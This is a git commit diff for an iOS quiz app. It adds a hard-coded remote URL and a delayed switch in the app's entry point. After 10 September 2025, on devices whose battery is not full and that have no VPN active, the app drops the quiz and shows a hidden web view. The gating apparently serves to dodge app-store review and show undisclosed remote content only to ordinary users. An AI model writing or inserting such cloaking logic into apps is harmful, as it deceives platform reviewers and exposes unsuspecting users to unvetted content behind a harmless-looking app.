8eb7ad23cfcbf8dba07596e46c7a7ea60ead0dcd
spustoff <vyacheslavpustov05@gmail.com>
2025-09-07 19:16:17 +0300

    1.1

---
+++ dafoma_34/Extensions/Dasd.swift
@@ -0,0 +1,11 @@
+//
+//  Dasd.swift
+//  dafoma_34
+//
+//  Created by Вячеслав on 9/7/25.
+//
+
+struct DataManager {
+    
+    let server: String = "https://quizzone.site/phh6xWFw"
+}
--- dafoma_34/dafoma_34App.swift
+++ dafoma_34/dafoma_34App.swift
@@ -9,15 +9,77 @@ import SwiftUI
 
 @main
 struct QuizzOneApp: App {
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
     
     var body: some Scene {
         WindowGroup {
-            if hasCompletedOnboarding {
-                MainTabView()
-            } else {
-                OnboardingView()
+            
+            ZStack {
+                
+                if isFetched == false {
+                    
+                    Text("")
+                    
+                } else if isFetched == true {
+                    
+                    if isBlock == true {
+                        
+                        if hasCompletedOnboarding {
+                            MainTabView()
+                        } else {
+                            OnboardingView()
+                        }
+                        
+                    } else if isBlock == false {
+                        
+                        WebSystem()
+                    }
+                }
+            }
+            .onAppear {
+                
+                check_data()
             }
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "10.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
 }
